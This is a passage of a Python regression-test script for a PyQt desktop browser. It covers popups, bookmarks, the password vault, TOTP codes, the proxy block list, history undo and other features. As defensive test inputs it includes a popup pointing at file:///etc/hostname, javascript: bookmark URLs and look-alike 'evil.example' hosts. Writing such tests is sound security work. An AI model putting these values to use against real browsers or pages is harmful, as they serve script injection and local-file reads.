H.load(_pp, srv.url("/twhome"))
_pop_was = list(getattr(br, "_blocked_popups", []) or [])
br._blocked_popups = [{"url": "file:///etc/hostname"},
                      {"url": "data:text/html,<p>x"},
                      {"url": srv.url("/timers")}]
_pm = br.popup_menu()
_ptexts = [a.text() for a in _pm.actions()]
br._blocked_popups = _pop_was
check("a refused popup's menu offers web addresses only",
      any("/timers" in x for x in _ptexts)
      and not any(x.startswith(("file:", "data:")) for x in _ptexts),
      str(_ptexts))
# the start page links a recent bookmark only when it is a web address
_st = br.new_tab(); H.spin(1200)
H.wait_for(lambda: jsq(_st, "typeof loadExtras", B.MAIN_WORLD_ID)
           == "function", 8000)
_links = H.js(_st, """(function () {
  bridge.startExtras = function (cb) { cb(JSON.stringify({recent: [
    {url: "javascript:window.__ran=1", title: "x"},
    {url: "https://a.example/", title: "a"}]})); };
  loadExtras();
  return JSON.stringify([].map.call(
    document.querySelectorAll('#extras a'), function (a) { return a.href; }));
})()""", B.MAIN_WORLD_ID)
check("the start page links a recent bookmark only if it is a web address",
      _links and json.loads(_links) == ["https://a.example/"], str(_links))
# the player's playlist does not follow the tab to the next page
_pl = br.open_player(["/tmp/review-a.mp4"]); H.spin(1200)
H.load(_pl, srv.url("/fakeplayer")); H.spin(800)
_got = H.js(_pl, "JSON.stringify(window.__got || null)", B.MAIN_WORLD_ID)
check("a page opened after the player is not handed his file paths",
      _got == "null", str(_got))
for _t in (_pp, _st, _pl):
    if _t is not None:
        _close_if_open(_t)
# OCR reads a temporary picture and leaves nothing in the config folder
_od = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_ostub = _od / "tess.sh"
_ostub.write_text('#!/bin/sh\n[ -f "$1" ] && echo "seen $1"\n')
_ostub.chmod(_ostub.stat().st_mode | _stat.S_IEXEC)
_real_rt = br.record_tools
br.record_tools = lambda: {"tesseract": str(_ostub)}
_ocr = {}
_img = B.QImage(40, 20, B.QImage.Format.Format_RGB32); _img.fill(0)
try:
    br.read_text_from_image(image=_img, then=lambda s: _ocr.update(v=s))
    H.wait_for(lambda: "v" in _ocr, 8000)
finally:
    br.record_tools = _real_rt
_opath = str(_ocr.get("v", "")).replace("seen ", "").strip()
check("OCR reads a temporary picture and removes it",
      _opath.startswith(_tempfile.gettempdir()) and not _Path(_opath).exists()
      and not (B.CONFIG_FILE.parent / "ocr-input.png").exists(), str(_ocr))

# ===== batch 39: switching sets / putting all away keeps the window ====
_tw = br.new_window(); H.spin(900)
H.load(_tw.current(), srv.url("/timers")); H.spin(300)
_tw.save_tabset("review-set")
_tw.restore_tabset("review-set", replace=True); H.spin(600)
_tw_ok = False
try:
    _tw_ok = _tw.isVisible() and len(_tw._real_tabs()) >= 1
except RuntimeError:
    _tw_ok = False
check("switching to a saved set in a one-tab window keeps the window",
      _tw_ok)
_aside_n = len(br.aside_sets())
try:
    _tw.set_aside(); H.spin(600)
    _tw_ok2 = _tw.isVisible() and len(_tw._real_tabs()) == 1
except RuntimeError:
    _tw_ok2 = False
check("...and so does putting every tab aside",
      _tw_ok2 and len(br.aside_sets()) == _aside_n + 1)
br.delete_tabset("review-set")
del br.aside_sets()[_aside_n:]
try:
    _tw.close()
except RuntimeError:
    pass
H.spin(400)

# ===== batch 40: Copy on the passwords page copies like a secret =======
if br.vault is not None and not br.vault_locked():
    _ce = br.vault.set_entry("review40.example", "https", "u40", "pw-review-40")
    _cid = (_ce or {}).get("id", "")
    _copied = json.loads(br.bridge.copyField(br._page_key, _cid, "password")
                         or "{}")
    _md = B.QGuiApplication.clipboard().mimeData()
    check("Copy on the passwords page marks the password secret and clears it",
          _copied.get("ok") is True and _md is not None
          and _md.hasFormat("x-kde-passwordManagerHint")
          and getattr(br, "_clip_mine", None) == "pw-review-40",
          str((_copied, _md is not None and list(_md.formats()))))
    B.QGuiApplication.clipboard().clear()
else:
    check("Copy on the passwords page marks the password secret and clears it",
          False, "vault not open in this run")

# ===== batch 42: a fetched TOTP code is asked for once, not every second
if br.vault is not None and not br.vault_locked():
    _tv_calls = []
    _real_tv = br.vault.totp_view
    _real_job = br.vault_job
    br.vault.provider.eager = False      # shadows the class's True
    br.vault.totp_view = lambda item_id: (_tv_calls.append(item_id)
                                          or {"code": "123456", "period": 30,
                                              "left": 20.0})
    _jobs42 = []
    br.vault_job = lambda work, done: _jobs42.append((work, done))
    try:
        _r1 = json.loads(br.bridge.totpFor(br._page_key, "it42"))
        _r2 = json.loads(br.bridge.totpFor(br._page_key, "it42"))
        for _w, _d in _jobs42:
            _d(_w())
        _r3 = json.loads(br.bridge.totpFor(br._page_key, "it42"))
    finally:
        br.vault.totp_view = _real_tv
        br.vault_job = _real_job
        del br.vault.provider.eager
    check("a TOTP code from a slow store is fetched once while it is valid",
          "pending" in _r1 and _r2.get("pending") == _r1.get("pending")
          and _r3.get("code") == "123456" and len(_tv_calls) == 1,
          str((_r1, _r2, _r3, len(_tv_calls))))

# ===== batch 45: stream-safe off gives his settings back after a restart
_ss_was = {k: br.config.get(k, "__absent__")
           for k in ("desktopNotify", "suggestHistory", "streamSafe",
                     "streamSafePrev")}
br.config.update(desktopNotify=True, suggestHistory=True, streamSafe=False)
br.config.pop("streamSafePrev", None)
br.stream_safe(True); br.stream_safe(True)
br._stream_prev = None                       # what a restart forgets
br.stream_safe(False)
_ss_after = (br.config.get("desktopNotify"), br.config.get("suggestHistory"))
for _k, _v in _ss_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("stream-safe off gives notifications and suggestions back, "
      "even after a restart", _ss_after == (True, True), str(_ss_after))

# ===== batch 46: a site's own accessibility switch survives a reload ====
_a11y_was = json.dumps(br.config.get("a11ySites") or {})
br.set_a11y("underlineLinks", True, host="127.0.0.1")
_ua = br.new_tab(url=None); H.spin(200)
H.load(_ua, srv.url("/links")); H.spin(500)
_ub = br.new_tab(url=None); H.spin(200)
H.load(_ub, srv.url("/links").replace("127.0.0.1", "localhost")); H.spin(500)
# the switch's own sheet, not the computed style: a link is underlined
# by default, so "not underlined" on the other host only ever held when
# a site theme had taken the line off within the spin
_dec = lambda v: jsq(v, "[].some.call(document.querySelectorAll('style'),"
                        " function (s) { return s.textContent.indexOf("
                        "'text-decoration: underline !important') >= 0; })"
                        " ? 'underline' : 'none'", B.MAIN_WORLD_ID)
H.wait_for(lambda: _dec(_ua) == "underline", 8000)
H.spin(800)
_da, _db = _dec(_ua), _dec(_ub)
br.config["a11ySites"] = json.loads(_a11y_was)
br.refresh_a11y()
check("a site's own accessibility switch is applied on a fresh load",
      _da == "underline" and _db != "underline", str((_da, _db)))
for _t in (_ua, _ub):
    _close_if_open(_t)
H.spin(300)

# ===== batch 47: live captions record one chunk at a time, and tidy up ==
_lc = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_rec = _lc / "rec.sh"
_rec.write_text('#!/bin/sh\nsleep 1\nhead -c 4000 /dev/zero > "$2"\n')
_wrd = _lc / "words.sh"
_wrd.write_text('#!/bin/sh\necho "some words"\n')
for _f in (_rec, _wrd):
    _f.chmod(_f.stat().st_mode | _stat.S_IEXEC)
_cap_was = {k: br.config.get(k, "__absent__")
            for k in ("captionRecorder", "captionTranscriber")}
br.config["captionRecorder"] = str(_rec)
br.config["captionTranscriber"] = str(_wrd)
_seen_text = []
_real_overlay = br.caption_overlay
br.caption_overlay = lambda text, view=None, clear=False: _seen_text.append(text)
try:
    _t1 = br._caption_tick()
    _t2 = br._caption_tick()
    H.wait_for(lambda: "some words" in _seen_text, 8000)
    _cdir = getattr(br, "_caption_dir", None)
    H.spin(300)
    _left = sorted(p.name for p in _Path(_cdir).glob("*")) if _cdir else ["?"]
    br.live_captions(False)
finally:
    br.caption_overlay = _real_overlay
    for _k, _v in _cap_was.items():
        if _v == "__absent__":
            br.config.pop(_k, None)
        else:
            br.config[_k] = _v
check("live captions start no second recorder while one is running",
      _t1 is True and _t2 is False, str((_t1, _t2)))
check("...and each chunk is gone once read, the folder once stopped",
      "some words" in _seen_text and _left == [] and _cdir
      and not _Path(_cdir).exists()
      and not (B.CONFIG_FILE.parent / "caption-chunk.wav").exists(),
      str((_seen_text, _left, _cdir)))

# ===== batch 48: the per-site proxy keeps to the block lists ===========
_rp = B.RuleProxy([], [], ("direct",), blocked=["tracker.example"])
try:
    import socket as _sock
    _c = _sock.create_connection(("127.0.0.1", _rp.port), 5)
    _c.sendall(b"CONNECT cdn.tracker.example:443 HTTP/1.1\r\n\r\n")
    _c.settimeout(5)
    try:
        _ans = _c.recv(200)
    except OSError:
        _ans = b""
    _c.close()
finally:
    _rp.close()
check("the per-site proxy refuses a blocked site and its subdomains",
      _rp.is_blocked("cdn.tracker.example") and not _rp.is_blocked("example")
      and _ans.startswith(b"HTTP/1.1 502"), repr(_ans[:60]))

# ===== batch 49: a bookmark delete can be undone, without losing newer ones
_bm_was = list(br.bookmarks)
br.bookmarks = [{"id": 501, "type": "link", "title": "keep me",
                 "url": "https://keep.example/", "parent": 0}]
br.save_bookmarks()
_gone49 = br.bridge.removeBookmark(br._page_key, 501)
br.bookmarks.append({"id": 502, "type": "link", "title": "new",
                     "url": "https://new.example/", "parent": 0})
_back = br.bridge.undoBookmark(br._page_key)
_after_undo = sorted(b.get("id") for b in br.bookmarks)
_refused = br.bridge.undoBookmark("not-the-key")
_none49 = br.bridge.removeBookmark(br._page_key, 99999)
br.bookmarks = _bm_was
br.save_bookmarks()
check("a deleted bookmark comes back, and one made since stays",
      _gone49 is True and _back == 2 and _after_undo == [501, 502]
      and _refused == 0, str((_gone49, _back, _after_undo, _refused)))
check("...and deleting nothing offers no undo", _none49 is False,
      str(_none49))

# ===== batch 50: an import into a remote store reaches the store ========
class _Lazy50:
    eager = False
    locked = False

    def __init__(self):
        self.stored = []

    def load(self):
        return {"items": [dict(i) for i in self.stored]}

    def put(self, item):
        row = dict(item, id="r%d" % (len(self.stored) + 1))
        self.stored.append(row)
        return {"id": row["id"]}

    def delete(self, item_id):
        return True
_lp = _Lazy50()
_lv = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))),
                      provider=_lp)
_bw = json.dumps({"items": [
    {"type": 1, "name": "a", "login": {"username": "u1", "password": "p1",
                                       "uris": [{"uri": "https://a.example"}]}},
    {"type": 1, "name": "b", "login": {"username": "u2", "password": "p2",
                                       "uris": [{"uri": "https://b.example"}]}}]})
_n50 = _lv.import_bitwarden(_bw)
_lv2 = B.PasswordVault(_lv.meta_file.parent, provider=_lp)
check("a Bitwarden import into a remote store is written to the store",
      _n50 == 2 and len(_lp.stored) == 2 and len(_lv2.items()) == 2,
      str((_n50, len(_lp.stored), len(_lv2.items()))))

# ===== batch 52: an identity fill keeps his name out of the username box
_sg = br.new_tab(url=None); H.spin(200)
H.load(_sg, srv.url("/signup")); H.spin(300)
_idf = {}
br.form_tool("fillident", view=_sg, then=lambda r: _idf.update(v=r),
             arg={"fullname": "Ada Review", "email": "ada@review.example",
                  "phone": "", "street": "", "city": "", "zip": "",
                  "country": ""})
H.wait_for(lambda: "v" in _idf, 5000)
_vals = H.js(_sg, "JSON.stringify(['u','e','n'].map(function (i) {"
                  " return document.getElementById(i).value; }))",
             B.MAIN_WORLD_ID)
check("an identity fill leaves a username box alone and fills the name box",
      _vals and json.loads(_vals) == ["", "ada@review.example", "Ada Review"],
      str(_vals))
_close_if_open(_sg)

# ===== batch 53: small things that were simply wrong ===================
_ics = br.ics_from_text("2026-11-20 23:30") or ""
check("an event at 23:30 with no end ends the next day",
      "DTSTART:20261120T233000" in _ics and "DTEND:20261121T003000" in _ics,
      _ics[:200])
check("the bar's calculator gives no complex answer",
      B._calc_answer("(-8)^0.5") is None and B._calc_answer("9^0.5")
      == ("= 3", "3"), str(B._calc_answer("(-8)^0.5")))
check("an .srt time never has 1000 milliseconds",
      B._srt_time(12.9996) == "00:00:13,000" and B._srt_time(1.5)
      == "00:00:01,500", B._srt_time(12.9996))
check("maxlength=-1 does not cut a generated password to 8",
      br.password_rules_for({"maxlength": -1})["length"] == 20,
      br.password_rules_for({"maxlength": -1}))
class _Desk53:
    def notes(self):
        return [{"t": int(B.time.time())}, {"t": 86400}]

    def todos(self):
        return []
_real_desk53 = br.desk
br.desk = lambda: _Desk53()
try:
    _dl = br.daily_log()
finally:
    br.desk = _real_desk53
check("the daily log counts the notes written today",
      (_dl or {}).get("notes") == 1, str(_dl)[:200])
_sh = br.new_tab(url=None); H.spin(200)
H.load(_sh, srv.url("/shorts/abcdef")); H.spin(300)
_shr = H.js(_sh, B.MEDIA_TOOLS2["shorts"], B.APP_WORLD_ID)
check("the Shorts player leaves another site's /shorts/ page alone",
      _shr == "", str(_shr))
_close_if_open(_sh)

# ===== batch 55: a submenu opened twice lists its rows once ============
_nv55 = br.new_tab(url=None); H.spin(200)
H.load(_nv55, srv.url("/links")); H.spin(300)
_nm = br.nav_menu(view=_nv55)
_info = next((a.menu() for a in _nm.actions()
              if a.menu() is not None
              and a.text() == br._ui_str("navInfoName")), None)
_counts = []
for _round in range(3):
    if _info is not None:
        _info.aboutToShow.emit(); H.spin(600)
        _counts.append(len(_info.actions()))
_dm = br.dev_menu()
_subs = [a.menu() for a in _dm.actions() if a.menu() is not None]
_grow = []
for _s in _subs:
    for _inner in [a.menu() for a in _s.actions() if a.menu() is not None]:
        _inner.aboutToShow.emit(); H.spin(900)
        _n1 = len(_inner.actions())
        _inner.aboutToShow.emit(); H.spin(900)
        if len(_inner.actions()) > _n1:
            _grow.append(_inner.title())
check("the page-info submenu lists its rows once however often it opens",
      len(_counts) == 3 and _counts[0] > 0 and len(set(_counts)) == 1,
      str(_counts))
check("...and no developer submenu grows on a second open", not _grow,
      str(_grow))
_close_if_open(_nv55)

# ===== batch 56: a userscript's @match ignores the port, as Chrome's does
import re as _re56
_m1 = br._plugin_pattern_to_regex("http://localhost/*")
_m2 = br._plugin_pattern_to_regex("https://*.example.com/*")
check("a userscript @match runs on a page with a port",
      _re56.match(_m1, "http://localhost:3000/x")
      and _re56.match(_m2, "https://www.example.com:8443/")
      and not _re56.match(_m1, "http://localhost.evil.example/")
      and not _re56.match(_m1, "http://localhost:3000.evil/"), (_m1, _m2))

# ===== batch 57: the player stops at the end of its queue ==============
_pv57 = br.open_player(); H.spin(1200)
H.wait_for(lambda: jsq(_pv57, "typeof window.__playerLoad",
                        B.MAIN_WORLD_ID) == "function", 8000)
_p57 = H.js(_pv57, """(function () {
  window.__playerLoad(['/tmp/review what?.mp3']);
  var m = document.querySelector('audio, video');
  var url = m ? m.getAttribute('src') : '';
  if (m) m.dispatchEvent(new Event('ended'));
  var after = document.querySelector('audio, video');
  return JSON.stringify([url, after === m]);
})()""", B.MAIN_WORLD_ID)
_p57v = json.loads(_p57 or "[]")
check("the player stops after the last file, and a ? in a name is a name",
      _p57v and "%3F" in _p57v[0] and _p57v[1] is True, str(_p57))
if _pv57 is not None:
    _close_if_open(_pv57)

# ===== batch 58: duplicates per jar, and a tracker strip that keeps the rest
_d1 = br.new_tab(url=None); H.spin(200)
H.load(_d1, srv.url("/twhome"))
_d2 = br.new_tab(private=True); H.spin(200)
H.load(_d2, srv.url("/twhome"))
br.close_duplicate_tabs(); H.spin(300)
check("closing duplicate tabs leaves a private tab's copy alone",
      br.tabs.indexOf(_d1) >= 0 and br.tabs.indexOf(_d2) >= 0)
for _t in (_d1, _d2):
    _close_if_open(_t)
_st58 = B.privacy.strip_tracking(
    "https://x.example/p?q=caf%E9&trkCampaign=1&utm_source=a&a=b+c")
check("a tracker strip keeps every other parameter exactly as written",
      _st58 == "https://x.example/p?q=caf%E9&a=b+c", _st58)

# ===== batch 59: history deletes take what is shown, undo keeps what is new
_hist_was = list(br.history)
_now59 = int(B.time.time())
br.history = [{"url": "https://a.example/1", "title": "a1", "t": _now59 - 50},
              {"url": "https://b.example/1", "title": "b1", "t": _now59 - 40},
              {"url": "https://a.example/2", "title": "a2", "t": _now59 - 30}]
_n59 = br.bridge.deleteHistory(json.dumps({"scoped": True, "q": "",
                                           "host": "a.example",
                                           "since": _now59 - 100,
                                           "until": _now59, "noise": True}))
_left59 = [e["url"] for e in br.history]
check("deleting a range with a site typed in takes only that site's rows",
      _n59 == 2 and _left59 == ["https://b.example/1"], str((_n59, _left59)))
br.history.append({"url": "https://c.example/new", "title": "c",
                   "t": _now59 - 5})
br.undo_history_delete()
_back59 = sorted(e["url"] for e in br.history)
check("...and its undo puts them back without losing a page visited since",
      _back59 == ["https://a.example/1", "https://a.example/2",
                  "https://b.example/1", "https://c.example/new"],
      str(_back59))
br._history_undo_at = B.time.monotonic() - 3600
br.delete_history_entries(["https://c.example/new"])
br._history_undo_at = B.time.monotonic() - 3600
check("...and an undo long after the delete does nothing",
      br.undo_history_delete() == 0
      and "https://c.example/new" not in [e["url"] for e in br.history])
br.history = _hist_was
br.save_history()

# ===== batch 60: a note's link and tags can be emptied; a due text kept ==
_nd60 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_dk60 = B.notes.Desk(_nd60)
_n60 = _dk60.save_note(None, "Plan", "body", "https://x.example/", ["a", "b"])
_dk60.save_note(_n60["id"], body="kept link")
_kept60 = _dk60.note(_n60["id"])
_dk60.save_note(_n60["id"], "Plan", "emptied", "", [])
_empt60 = _dk60.note(_n60["id"])
check("a note keeps its link when only the body changes, and can be emptied",
      _kept60["link"] == "https://x.example/" and _kept60["tags"] == ["a", "b"]
      and _empt60["link"] == "" and _empt60["tags"] == [],
      str((_kept60.get("link"), _empt60.get("link"), _empt60.get("tags"))))
(_nd60 / "todo.md").write_text("- [ ] a (due: tomorrow)\n- [ ] b\n")
_dk60.toggle_todo(1)
check("a to-do's unreadable due text survives ticking another one",
      "(due: tomorrow)" in (_nd60 / "todo.md").read_text(),
      (_nd60 / "todo.md").read_text())

# ===== batch 61: two filter lists with one file name keep two files =====
_nm61 = br._ad_list_names(["https://a.example/lists/filters.txt",
                           "https://b.example/filters.txt",
                           "https://c.example/easylist.txt"])
check("two filter lists both called filters.txt are kept in two files",
      len(set(_nm61)) == 3 and _nm61[0] == "filters.txt"
      and _nm61[2] == "easylist.txt", str(_nm61))

# ===== batch 62: a privacy file is taken only in the shapes it is read in
_pf = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))) / "privacy.json"
_pv_was = {k: br.config.get(k, "__absent__")
           for k in ("permissions", "guardOff", "blockHosts", "httpsOnly")}
_pf.write_text(json.dumps({"permissions": ["a"], "guardOff": ["b"],
                           "blockHosts": ["ok.example"], "httpsOnly": True}))
_taken62 = br.import_privacy(str(_pf))
_shape62 = (type(br.config.get("permissions", {})).__name__,
            type(br.config.get("guardOff", {})).__name__,
            br.config.get("blockHosts"))
for _k, _v in _pv_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.refresh_guard_scripts()
check("a privacy file with a list where a table belongs is not taken",
      _taken62 == 2 and _shape62[0] == "dict" and _shape62[1] == "dict"
      and _shape62[2] == ["ok.example"], str((_taken62, _shape62)))

# ===== batch 63: a mod jar with an odd fabric.mod.json is read, not raised
import zipfile as _zip63
_jd = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_odd = []
for _n, _body in (("list.jar", b"[]"), ("deps.jar", b'{"id":"x","depends":["a"]}')):
    with _zip63.ZipFile(str(_jd / _n), "w") as _z:
        _z.writestr("fabric.mod.json", _body)
    try:
        _odd.append(br.mod_info(str(_jd / _n)))
    except Exception as _e:
        _odd.append(repr(_e))
check("a mod jar whose fabric.mod.json is a list, or lists its depends, "
      "is read", all(isinstance(x, dict) for x in _odd)
      and _odd[1].get("id") == "x", str(_odd))

# ===== batch 64/65: Ctrl+Enter leaves a search alone; the pad poll returns
br.urlbar.setText("hello world")
from PyQt6.QtGui import QKeyEvent as _QKE
_ce = _QKE(B.QEvent.Type.KeyPress, B.Qt.Key.Key_Return,
           B.Qt.KeyboardModifier.ControlModifier)
_navs = []
_real_nav = br._navigate
br._navigate = lambda *a, **k: _navs.append(br.urlbar.text())
try:
    br.eventFilter(br.urlbar, _ce)
    br.urlbar.setText("python")
    br.eventFilter(br.urlbar, _ce)
finally:
    br._navigate = _real_nav
check("Ctrl+Enter finishes one word into a domain and leaves a phrase alone",
      _navs == ["hello world", "www.python.com"], str(_navs))
br.urlbar.setText("")
br.config["gamepadOn"] = True
_gw = br.new_window(); H.spin(800)
_gt = getattr(_gw, "_pad_timer", None)
_g_on = _gt is not None and _gt.isActive()
br.config["gamepadOn"] = False
try:
    if _gt is not None:
        _gt.stop()
    _gw.close()
except RuntimeError:
    pass
H.spin(300)
check("a controller switched on last time is polled from the start", _g_on)

# ===== batch 66: switching Do Not Disturb off says what was held ========
_dnd_was = br.config.get("dndUntil", 0)
_flashes66 = []
_real_flash66 = br.flash
br.flash = lambda text, *a, **k: _flashes66.append(str(text))
try:
    br.config["dndUntil"] = int(B.time.time()) + 600
    br._held_notifications = [{"origin": "a", "title": "t"}] * 3
    br.do_not_disturb()
    H.wait_for(lambda: not br._held_notifications, 4000)
finally:
    br.flash = _real_flash66
    br.config["dndUntil"] = _dnd_was
check("switching Do Not Disturb off says how many notifications it held",
      not br._held_notifications
      and any(f == br._ui_str("dndHeld") % 3 for f in _flashes66),
      str(_flashes66))

# ===== batch 67: a video's place is kept under its own address ==========
_mp = br.new_tab(url=None); H.spin(200)
H.load(_mp, srv.url("/twhome")); H.spin(300)
_places_was = json.dumps(br.media_places())
_a67 = B.clean_url(srv.url("/videoA"))
_mp._media_url = _a67
_mp._media_loading = False           # a same-page move, as pushState is
_real_mt2 = br.media_tool2
br.media_tool2 = lambda name, view=None, then=None, arg=None: then(
    json.dumps({"at": 600, "duration": 3600}))
try:
    br.note_media_place(_mp)
finally:
    br.media_tool2 = _real_mt2
_tbl67 = dict(br.media_places())
_b67 = B.clean_url(_mp.url().toString())
br.media_places().clear()
br.media_places().update(json.loads(_places_was))
check("after a same-page move the place is kept for the video he left",
      (_tbl67.get(_a67) or {}).get("at") == 600 and _b67 not in _tbl67,
      str(list(_tbl67)[:4]))
_close_if_open(_mp)

# ===== batch 68: a capture cut at its limit ends with the right band ====
_bv = br.new_tab(url=None); H.spin(200)
H.load(_bv, srv.url("/bands")); H.spin(500)
_inner = H.js(_bv, "window.innerHeight", B.APP_WORLD_ID) or 0
_lim = (_inner * 3) + 250 if _inner else 0
_img68 = B.capture.full_page(_bv, B.APP_WORLD_ID, settle=60, limit=_lim) \
    if _lim else None
_ok68, _got68 = False, None
if _img68 is not None and not _img68.isNull():
    _sc = _img68.height() / float(_lim)
    _px = _img68.pixelColor(5, int((_lim - 20) * _sc))
    _got68 = _px.name()
    # the band at limit-20 is band number (lim-20)//100: red if even
    _even = ((_lim - 20) // 100) % 2 == 0
    # by which colour wins, not by value: site theming may darken them
    _ok68 = (_px.red() > _px.blue() + 40) if _even \
        else (_px.blue() > _px.red() + 40)
check("a capture cut at its limit ends with the content above the limit",
      _ok68, str((_inner, _lim, _got68)))
_close_if_open(_bv)

# ===== batch 69: a clip is dropped by name, whatever was copied since ===
_cd69 = B.notes.Desk(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
_cd69.add_clip("first"); _cd69.add_clip("second")
_row_of_first = [c["text"] for c in _cd69.clips()].index("first")
_cd69.add_clip("third")                       # copied while the list showed
_cd69.drop_clip(_cd69.clip_index(_row_of_first, "first"))
check("dropping a clip takes that clip even after a new one was copied",
      [c["text"] for c in _cd69.clips()] == ["third", "second"],
      str([c["text"] for c in _cd69.clips()]))

# ===== batch 70: a bare host name is the home network ==================
check("a bare host name counts as the home network, as promised",
      B.privacy.is_local("router") and B.privacy.is_local("nas.lan")
      and B.privacy.is_local("fritz.box") and B.privacy.is_local("3232235777")
      and not B.privacy.is_local("example.com")
      and not br.is_local_address("router"))
_ok70, _u70 = B.privacy.check_request({"blockLocal": True}, B.QUrl("http://router/"),
                                      B.QUrl("https://evil.example/"))
check("...so a web page cannot send a frame at http://router/", _ok70 is False)

# ===== batch 71: an address with :// in its query can be a bookmark ======
check("a bookmark address with :// in its query is taken",
      B._clean_bookmark_url("example.com/go?to=https://other.org")
      == "https://example.com/go?to=https://other.org"
      and B._clean_bookmark_url("javascript:alert(1)") == ""
      and B._clean_bookmark_url("https://a.example/") == "https://a.example/",
      B._clean_bookmark_url("example.com/go?to=https://other.org"))

# ===== batch 72: a rule set for a parent domain can be switched off below
_ns_was = list(br.config.get("noScriptSites") or [])
br.config["noScriptSites"] = ["example.com"]
_on_before = br.site_rule_on("noScriptSites", "docs.example.com")
_after = br.toggle_site_rule("noScriptSites", "docs.example.com")
_on_now = br.site_rule_on("noScriptSites", "docs.example.com")
br.config["noScriptSites"] = _ns_was
br._reapply_site_rules()
check("a site rule set for example.com can be switched off from docs.example.com",
      _on_before and _after is False and not _on_now,
      str((_on_before, _after, _on_now)))

# ===== batch 73: an unsaved on-by-default switch goes off in one click ===
_rl_was = br.config.get("readlineKeys", "__absent__")
br.config.pop("readlineKeys", None)
_rl = br.set_flag("readlineKeys", default=True)
if _rl_was == "__absent__":
    br.config.pop("readlineKeys", None)
else:
    br.config["readlineKeys"] = _rl_was
check("readline keys, on by default and never saved, go off in one click",
      _rl is False, str(_rl))

# ===== batch 74: one odd stored box name does not stop the others ========
_fh = br.new_tab(url=None); H.spin(200)
H.load(_fh, srv.url("/formhist")); H.spin(300)
_fhr = {}
br.form_tool("suggest", view=_fh, then=lambda r: _fhr.update(v=r),
             arg={"input:2": ["x"], "it's": ["y"], "city": ["Berlin"]})
H.wait_for(lambda: "v" in _fhr, 5000)
_lst = H.js(_fh, "document.getElementById('c').getAttribute('list') || ''",
            B.MAIN_WORLD_ID)
check("an odd stored box name does not stop suggestions for the next box",
      bool(_lst), str((_fhr, _lst)))
_close_if_open(_fh)

# ===== batch 75: a tooltip shows "&" as "&", and markup as text ==========
from PyQt6.QtWidgets import QLabel as _QL75
from PyQt6.QtGui import QTextDocument as _QTD75
_lb75 = _QL75()
B.set_plain(_lb75, "x", tooltip="a&b <i>c</i>.pdf")
_doc75 = _QTD75()
_doc75.setHtml(_lb75.toolTip())
check("a tooltip shows an & and a tag as the characters they are",
      _doc75.toPlainText().strip() == "a&b <i>c</i>.pdf",
      repr(_doc75.toPlainText()))

# ===== batch 76: the cookie-banner starter leaves other "accept" buttons =
_cb = br.new_tab(url=None); H.spin(200)
H.load(_cb, srv.url("/accepts")); H.spin(300)
H.js(_cb, B.STARTER_PLUGINS["cookie-away"][2], B.MAIN_WORLD_ID)
H.wait_for(lambda: jsq(_cb, "window.__clicked.length", B.MAIN_WORLD_ID)
           >= 1, 6000)
H.spin(1500)
_clicked76 = H.js(_cb, "JSON.stringify(window.__clicked)", B.MAIN_WORLD_ID)
check("the cookie-banner plugin clicks the banner's button and nothing else",
      _clicked76 == '["banner"]', str(_clicked76))
_close_if_open(_cb)

# ===== batch 77: the developer menu has a row of its own in the palette ==
_strs77 = [r["str"] for r in br.actions_list() if r["id"] == "devmenu"]
_shared77 = [r["id"] for r in br.actions_list()
             if _strs77 and r["str"] == _strs77[0]]
check("the developer menu's palette row is not hidden behind the inspector's",
      _shared77 == ["devmenu"], str(_shared77))

# ===== batch 78: merging duplicate bookmarks keeps one per browser ======
_bm78 = list(br.bookmarks)
br.bookmarks = [
    {"id": 801, "type": "link", "title": "x", "url": "https://dup.example/",
     "parent": 0, "t": 1, "sid": "work"},
    {"id": 802, "type": "link", "title": "x", "url": "https://dup.example/",
     "parent": 0, "t": 2},
    {"id": 803, "type": "link", "title": "x", "url": "https://dup.example/",
     "parent": 0, "t": 3}]
_g78 = br.merge_duplicate_bookmarks()
_ids78 = sorted(b["id"] for b in br.bookmarks)
br.bookmarks = _bm78
br.save_bookmarks()
check("merging duplicates keeps one per virtual browser",
      _g78 == 1 and _ids78 == [801, 802], str((_g78, _ids78)))

# ===== batch 79: a 1Password edit empties only what he emptied =========
_cur79 = {"title": "t", "fields": [{"id": "username", "value": "bob"},
                                   {"id": "password", "value": "pw"},
                                   {"id": "totp", "value": "SEED"},
                                   {"id": "notesPlain", "value": "my note"}],
          "urls": [{"href": "https://a.example/login?x=1", "primary": True},
                   {"href": "https://b.example/"}]}
# a summary row after _normalize: every box present, most of them ""
_it79 = {"type": "login", "id": "abc", "remote": True, "username": "",
         "password": "", "totp": "", "note": "", "host": "a.example",
         "scheme": "https", "title": "t2"}
_keep79 = B.OnePasswordProvider._merged(
    _cur79, _it79, B.OnePasswordProvider._fields_for(_it79))
_kv79 = {f["id"]: f["value"] for f in _keep79["fields"]}
_clr79 = B.OnePasswordProvider._merged(
    _cur79, _it79, B.OnePasswordProvider._fields_for(
        _it79, cleared=("username",)))
_cv79 = {f["id"]: f["value"] for f in _clr79["fields"]}
check("a 1Password rename keeps the item's TOTP, note and username",
      _kv79 == {"username": "bob", "password": "pw", "totp": "SEED",
                "notesPlain": "my note"}, str(_kv79))
check("...a username he emptied is sent empty, and nothing else is",
      _cv79 == {"username": "", "password": "pw", "totp": "SEED",
                "notesPlain": "my note"}, str(_cv79))
check("...and a title change leaves the login's addresses as they were",
      [u["href"] for u in _keep79["urls"]]
      == ["https://a.example/login?x=1", "https://b.example/"],
      str(_keep79["urls"]))

# ===== batch 80: a terminal editor is started in a terminal ==============
_real_which80 = B.shutil.which
B.shutil.which = lambda name: {"kitty": "/usr/bin/kitty"}.get(name)
try:
    _c1 = br._editor_command("/usr/bin/nvim")
    _c2 = br._editor_command("/usr/bin/kate")
finally:
    B.shutil.which = _real_which80
B.shutil.which = lambda name: None
try:
    _c3 = br._editor_command("/usr/bin/nano")
finally:
    B.shutil.which = _real_which80
